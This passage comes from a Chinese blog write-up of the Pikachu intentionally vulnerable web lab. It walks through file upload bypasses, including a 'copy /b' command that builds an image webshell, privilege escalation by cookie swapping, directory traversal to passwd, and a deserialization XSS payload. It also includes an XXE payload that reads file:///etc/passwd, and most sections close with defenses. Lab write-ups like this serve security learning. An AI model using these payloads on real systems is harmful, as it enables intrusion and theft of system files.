+<p>成功实现任意文件下载。</p>
+<p>**防范措施 ： **</p>
+<p>​    1、对传入的文件名进行严格的过滤和限定。</p>
+<p>​    2、对文件下载的目录进行严格的限定。</p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="客户端验证"><a href="#客户端验证" class="headerlink" title="客户端验证"></a>客户端验证</h3><p>使用前端JS验证上传文件的类型，绕过的方式很多i，burp自带移除js，抓包改包等操作。</p>
+<p><img src="https://i.loli.net/2021/01/18/8M3quCb1LaON5tx.png"></p>
+<h3 id="MIME"><a href="#MIME" class="headerlink" title="MIME"></a>MIME</h3><p>通过抓包修改文件名后缀即可绕过。</p>
+<p><img src="https://i.loli.net/2021/01/18/mUajvT1E63rDKfG.png" alt="修改jpg为php"></p>
+<h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h3><p>​    getimagesize() 返回结果中有文件大小和文件类型，如果用这个函数来获取类型，从而判断是否是图片。</p>
+<p>图片马制作：</p>
+<blockquote>
+<p>1、直接伪造头部GIF89A。</p>
+<p>2、cmd命令：copy /b test.png + muma.php ccc.png。</p>
+<p>3、使用GIMP（开源托修改源件），通过增加备注，写入执行命令。</p>
+</blockquote>
+<p>使用cmd命令制作一张图片马muma.php</p>
+<p><img src="https://i.loli.net/2021/01/18/oAeXiy2rBn7fMEs.png"></p>
+<p>上传成功后发现并不能直接利用。那么结合之前的文件包含漏洞加以利用。、</p>
+<p>首先复制文件的路径。构造到同级目录下并拼接到本地文件包含的位置。</p>
+<p><img src="https://i.loli.net/2021/01/18/n2jOm1gwiANIYR4.png"></p>
+<p>成功执行phpinfo()。</p>
+<p><img src="https://i.loli.net/2021/01/18/wxEj1RFyVWnecDP.png"></p>
+<h2 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h2><p>​    1、不在前端使用JS实施上传限制策略</p>
+<p>​    2、通过服务端对上传文件进行限制：</p>
+<p>​        a、进行多条组合检查：比如文件的大小，路径，扩展名，文件类型，文件            完整性</p>
+<p>​        b、对上传的文件在服务器上存储时进行重命名（制定合理的命名规则）</p>
+<p>​        c、对服务器端上传文件的目录进行权限控制（比如只读），限制执行权限            带来的危害。</p>
+<h1 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h1><p>**概述 : **</p>
+<p>由于没有将用户权限进行严格的判断，导致低权限的账号（如普通用户）可以去完成高权限账号（如超级管理员）范围内的操作。</p>
+<p><strong><em>平行越权</em></strong></p>
+<p>A用户和B用户属于同一级别的用户，但各自不能操作对方个人信息，A用户如果越权操作B用户的个人信息的情况称为平行越权操作。</p>
+<p><strong><em>垂直越权</em></strong></p>
+<p>A用户权限高于B用户，B用户越权操作A用户的权限的情况称为垂直越权。</p>
+<p>越权漏洞属于逻辑漏洞，是由于权限校验的逻辑不够严谨导致。</p>
+<p>每个应用系统的用户的权限是根据其业务功能划分的，而每个企业的业务又都不一样。因此越权漏洞很难通过扫描工具体现出来，往往需要通过手动进行测试。</p>
+<h2 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h2><p>这里使用Lucy的账号登陆。</p>
+<p><img src="https://i.loli.net/2021/01/22/cIlQFj6xNWSesqH.png"></p>
+<p>登陆后查看个人信息。观察URL</p>
+<p><img src="https://i.loli.net/2021/01/22/ctNX5vfmYbFsDSM.png"></p>
+<p>尝试将lucy更改为lili。</p>
+<p><img src="https://i.loli.net/2021/01/22/zUGaXLx5l4TYniW.png"></p>
+<p>在登陆为lucy的情况下查看到了lili的个人信息。</p>
+<h2 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2><p>首先使用admin（超级管理员）登陆</p>
+<p><img src="https://i.loli.net/2021/01/22/B8VZN16CvQOXoL9.png"></p>
+<p>admin拥有查看和添加用户两个权限。</p>
+<p>添加一名用户。</p>
+<p><img src="https://i.loli.net/2021/01/22/vgTpr2klm185sPd.png"></p>
+<p>此时用户haha成功添加，退出后使用普通用户pilachu登陆</p>
+<p><img src="https://i.loli.net/2021/01/22/vBXVlc5q1ErMPTh.png"></p>
+<p>此用户仅有查看权限。下面骚操作开始。</p>
+<p>查看之前admin添加用户的包</p>
+<p><img src="https://i.loli.net/2021/01/22/GCdbIR4pXj9Pmle.png"></p>
+<p>在登陆pikachu普通用户的情况下将之前admin的添加用户的包进行重发。</p>
+<p><img src="https://i.loli.net/2021/01/22/BC3KRXr5bjUHaco.png"></p>
+<p>系统检测到admin用户并未登陆，需重新登陆。</p>
+<p>查看当前登陆状态下pikachu用户的包</p>
+<p><img src="https://i.loli.net/2021/01/22/AoTvik9waR5BrOz.png"></p>
+<p>猜测登陆状态是以cookie来判断的。将当前普通用户的cookie赋给之前admin的包里。</p>
+<p><img src="https://i.loli.net/2021/01/22/aW8k5eNzMdZOmtD.png"></p>
+<p>发包，回到浏览器刷新查看用户列表。</p>
+<p><img src="https://i.loli.net/2021/01/22/rBsRiFGjh8I5QbE.png"></p>
+<p>垂直越权漏洞触发，添加用户越权。</p>
+<h1 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h1><h2 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h2><p>web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。 从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。</p>
+<p>需要区分一下的是,如果你通过不带参数的url（比如：<a target="_blank" rel="noopener" href="http://xxxx/doc%EF%BC%89%E5%88%97%E5%87%BA%E4%BA%86doc%E6%96%87%E4%BB%B6%E5%A4%B9%E9%87%8C%E9%9D%A2%E6%89%80%E6%9C%89%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%EF%BC%8C%E7%A7%B0%E4%B8%BA%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E3%80%82">http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，称为敏感信息泄露。</a></p>
+<p>这里点击下方选项后url是这样的。</p>
+<p><img src="https://i.loli.net/2021/01/23/qj1N4g2IBERZzyV.png"></p>
+<p>尝试构造url进行目录遍历</p>
+<p><img src="https://i.loli.net/2021/01/23/TWUFc1YVlg38ikZ.png"></p>
+<p>结果如下：</p>
+<p><img src="https://i.loli.net/2021/01/23/7TV2gpJPHKX3Aak.png"></p>
+<p>成功遍历到敏感文件passwd。</p>
+<p>删除url中的php文件到目录下访问。</p>
+<p><img src="https://i.loli.net/2021/01/23/tvlEBaN1yHuFKsT.png"></p>
+<p>这里不仅暴露出了目录，同时服务器的中间件，操作系统均被暴露出来。</p>
+<h1 id="敏感文信息泄露"><a href="#敏感文信息泄露" class="headerlink" title="敏感文信息泄露"></a>敏感文信息泄露</h1><h2 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h2><p>由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。 比如：</p>
+<ul>
+<li>通过访问url下的目录，可以直接列出目录下的文件列表;</li>
+<li>输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;</li>
+<li>前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;</li>
+</ul>
+<p>类似以上这些情况，我们成为敏感信息泄露。敏感信息泄露虽然一直被评为危害比较低的漏洞，但这些敏感信息往往给攻击着实施进一步的攻击提供很大的帮助,甚至“离谱”的敏感信息泄露也会直接造成严重的损失。 因此,在web应用的开发上，除了要进行安全的代码编写，也需要注意对敏感信息的合理处理。</p>
+<p>这里查看以下源代码，尝试查找有用的信息。</p>
+<p>在代码底部，发现测试账号的注释！</p>
+<p><img src="https://i.loli.net/2021/01/23/2k7vYc9eOK1ldUs.png"></p>
+<p>使用此账号尝试登陆！</p>
+<p>F12查看cookie等信息：</p>
+<p><img src="https://i.loli.net/2021/01/23/5HAbBwILMjs9g2X.png"></p>
+<p>发现密码密文等信息。</p>
+<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><h2 id="序列化serialize"><a href="#序列化serialize" class="headerlink" title="序列化serialize()"></a>序列化serialize()</h2><p>将一个对象转换成可传输的字符串。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##序列化pikachu</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $test=<span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $s=<span class="keyword">new</span> S(); <span class="comment">//创建一个对象</span></span><br><span class="line">    $ser_data = serialize($s); <span class="comment">//把这个对象进行序列化</span></span><br><span class="line">	<span class="keyword">echo</span> $ser_data;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#################输出结果################</span></span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;pikachu&quot;</span>;&#125;</span><br><span class="line"><span class="comment">########################################</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>O： 代表object</p>
+<p>1:代表对象名字长度为一个字符</p>
+<p>S：对象的名称</p>
+<p>1：代表对象里面的一个变量</p>
+<p>s：数据类型</p>
+<p>4：变量名称长度</p>
+<p>test：变量名称</p>
+<p>s:数据类型</p>
+<p>7：变量值的长度</p>
+</blockquote>
+<h2 id="反序列化unserialize"><a href="#反序列化unserialize" class="headerlink" title="反序列化unserialize()"></a>反序列化unserialize()</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $ser=<span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $s=<span class="keyword">new</span> S(); <span class="comment">//创建一个对象</span></span><br><span class="line">    $ser_data = serialize($s); <span class="comment">//把这个对象进行序列化</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Serialize:&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> $ser_data;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Unserialize:&#x27;</span>;</span><br><span class="line"><span class="comment">//将$ser_data进行反序列化</span></span><br><span class="line">    $unser_data = unserialize($ser_data);</span><br><span class="line">    <span class="keyword">echo</span> $unser_data -&gt; ser;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/23/BZc9UwPIhglVJWY.png"></p>
+<p>序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题。</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">常见的几个魔法函数:</span><br><span class="line">__construct()当一个对象创建时被调用</span><br><span class="line"></span><br><span class="line">__destruct()当一个对象销毁时被调用</span><br><span class="line"></span><br><span class="line">__toString()当一个对象被当作一个字符串使用</span><br><span class="line"></span><br><span class="line">__sleep() 在对象在被序列化之前运行</span><br><span class="line"></span><br><span class="line">__wakeup将在序列化之后立即被调用</span><br></pre></td></tr></table></figure>
+
+<p>下面制作一个序列化的xss弹窗语句。</p>
+<p><img src="https://i.loli.net/2021/01/23/Kjw5aBGDvNuWYfP.png"></p>
+<p><img src="https://i.loli.net/2021/01/23/UYTIpaS5ywiN1sJ.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###################payload#####################</span></span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">29</span>:<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/01/23/JGLYbguOVWo7XEB.png"></p>
+<h1 id="XXE-xml-external-entity-injection"><a href="#XXE-xml-external-entity-injection" class="headerlink" title="XXE(xml external entity -injection)"></a>XXE(xml external entity -injection)</h1><blockquote>
+<p><strong><em>xml外部实体注入漏洞 （简称XXE漏洞）:</em></strong></p>
+<p>XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。</p>
+<p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p>
+<p>当”攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题”<br>也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。</p>
+</blockquote>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--第一部分：XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--第二部分：文档类型定义DTD--&gt;</span></span><br><span class="line"><span class="meta">&lt;!Doctype <span class="meta-keyword">note</span>[    &lt;!--定义此文档是note类型的文档--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">entity-name</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;URL/URL&quot;</span>&gt;</span> &lt;!--外部实体声明--&gt;</span></span><br><span class="line"><span class="meta">]]]&gt;</span></span><br><span class="line"><span class="comment">&lt;!---第三部分：文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>DTD :Document Type Definition 即文档类型定义，用来为XML文档定义语法约束。</strong></p>
+<p>1、DTD内部声明</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素[元素声明]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>2、DTD外部引用</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素名称SYSTEM <span class="meta-string">&quot;外部DTD的URI&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>3、引用公共DTD</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素名称PUBLIC <span class="meta-string">&quot;DTD标识名&quot;</span> <span class="meta-string">&quot;公用DTD的URI&quot;</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="外部实体引用payload"><a href="#外部实体引用payload" class="headerlink" title="外部实体引用payload"></a>外部实体引用payload</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1,0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xml</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xxe</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">xxe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xml</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>外部引用支持http, file, ftp等协议。</p>
+<p>如果一个接口支持接收xml数据，且没有对xml数据做任何安全上的措施，就可能导致XXE漏洞。</p>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul>
+<li>禁止使用外部实体，例如libxml_disable_entity_loader(true).</li>
+<li>过滤用户提交的XML数据，防止出现非法内容。</li>
+</ul>
+<h1 id="不安全的URL跳转"><a href="#不安全的URL跳转" class="headerlink" title="不安全的URL跳转"></a>不安全的URL跳转</h1><h2 id="概述-3"><a href="#概述-3" class="headerlink" title="概述"></a>概述</h2><p>不安全的url跳转问题可能发生在一切执行了url地址跳转的地方。<br>如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的url地址)参数作为了跳转的目的地,而又没有做判断的话<br>就可能发生”跳错对象”的问题。</p>
+<p>url跳转比较直接的危害是:<br>钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站</p>
+<p><img src="https://i.loli.net/2021/01/25/ca4UgdDXoLmMnuO.png"></p>
+<h2 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h2><p>应对前端的输入做严格的审查。</p>
+<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="概述-4"><a href="#概述-4" class="headerlink" title="概述"></a>概述</h2><p>SSRF(Server-Side Request Forgery,服务器端请求伪造)是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击目标是外网无法访问的内部系统（请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统）</p>
+<p>SSRF的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p>
+<p>如攻击者操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片等，利用服务端的请求伪造。SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。</p>
+<p>URL链接中更换访问链接</p>
+<p>后端访问远程资源或本地资源，并将信息传递至前端。</p>
+<p><img src="https://i.loli.net/2021/01/25/qWcPnipRjSlx9Um.png"></p>
+<p>file_get_content</p>
+<p>访问远程资源文件或者本地资源文件，并打印至前端。</p>
+<p><img src="https://i.loli.net/2021/01/25/Rx2LDy9AWw7uKfU.png"></p>
+<h2 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h2><ul>
+<li>限制请求的端口仅能为Web端口，只允许访问HTTP或者HTTPS的请求。</li>
+<li>限制不能访问内网的IP，以防止对内网进行攻击。</li>
+<li>屏蔽返回的详细消息。</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="任重而道远"><a href="#任重而道远" class="headerlink" title="任重而道远"></a>任重而道远</h2><p>pikachu这个靶场漏洞题目的基础漏洞类型比较全面，但是对题目并没有很深入，但是都比较经典。就如靶场开头所说**<em>少就是快，慢就是快**</em>。</p>
+<p><strong>一入安全深似海，从此游戏是路人。</strong></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Shawn</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://52hertzi.com/2020/11/08/Pikachu%E4%B9%8B%E9%80%9A%E5%85%B3%E4%B9%8B%E6%97%85/">http://52hertzi.com/2020/11/08/Pikachu%E4%B9%8B%E9%80%9A%E5%85%B3%E4%B9%8B%E6%97%85/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://52hertzi.com" target="_blank">52hertzi</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a><a class="post-meta__tags" href="/tags/%E9%9D%B6%E5%9C%BA/">靶场</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/01/23/6NfDvmI2c5VesXP.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://i.loli.net/2020/11/09/NkrICVse9BUfKMx.png" target="_blank"><img class="post-qr-code-img" src="https://i.loli.net/2020/11/09/NkrICVse9BUfKMx.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://i.loli.net/2020/11/09/kLFt7qs1woZvu4x.jpg" target="_blank"><img class="post-qr-code-img" src="https://i.loli.net/2020/11/09/kLFt7qs1woZvu4x.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/12/23/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AD%A6%E6%A0%A1%E5%AE%9E%E9%AA%8C%E5%AE%A4%E9%92%93%E9%B1%BC/"><img class="prev-cover" src="https://i.loli.net/2020/11/09/A9IgHFYfoUxyTP7.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">记一次实验室钓鱼</div></div></a></div><div class="next-post pull-right"><a href="/2020/11/01/upload/"><img class="next-cover" src="https://i.loli.net/2021/01/23/h8ZrB51It3QFLvx.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">文件上传之upload-labs</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/05/31/Vulhub之DRIFTINGBLUES-7/" title="Vulhub之DRIFTINGBLUES:7"><img class="cover" src="https://i.loli.net/2021/05/31/AN4oqhDJuVIHeXP.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-06-30</div><div class="title">Vulhub之DRIFTINGBLUES:7</div></div></a></div><div><a href="/2020/11/01/upload/" title="文件上传之upload-labs"><img class="cover" src="https://i.loli.net/2021/01/23/h8ZrB51It3QFLvx.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-06-30</div><div class="title">文件上传之upload-labs</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://i.loli.net/2020/11/09/qgoaAWLQdRIs7uD.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Shawn</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">28</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/52hertzi"><i class="fab fa-github"></i><span>Follow Me</span></a></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">2020 实鼠不易 , 2021 牛转乾坤！淦</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%87%E8%AE%B0"><span class="toc-number">1.0.1.</span> <span class="toc-text">切记</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">2.</span> <span class="toc-text">暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0%EF%BC%88Burte-Force%EF%BC%89"><span class="toc-number">2.1.</span> <span class="toc-text">概述（Burte Force）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-number">2.2.</span> <span class="toc-text">基于表单的暴力破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-server"><span class="toc-number">2.3.</span> <span class="toc-text">验证码绕过(on server)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%88on-client%EF%BC%89"><span class="toc-number">2.4.</span> <span class="toc-text">验证码绕过（on client）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#token%E9%AA%8C%E8%AF%81"><span class="toc-number">2.5.</span> <span class="toc-text">token验证</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS%EF%BC%88%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">XSS（跨站脚本攻击）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-number">3.1.</span> <span class="toc-text">跨站脚本漏洞概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B"><span class="toc-number">3.2.</span> <span class="toc-text">跨站脚本漏洞类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E5%BD%A2%E6%88%90%E7%9A%84%E5%8E%9F%E5%9B%A0%E5%8F%8A%E6%B5%8B%E8%AF%95%E5%9F%BA%E6%9C%AC%E6%B5%81%E7%A8%8B"><span class="toc-number">3.3.</span> <span class="toc-text">XSS形成的原因及测试基本流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%EF%BC%88Get%EF%BC%89"><span class="toc-number">3.4.</span> <span class="toc-text">反射型XSS（Get）</span></a></li><li 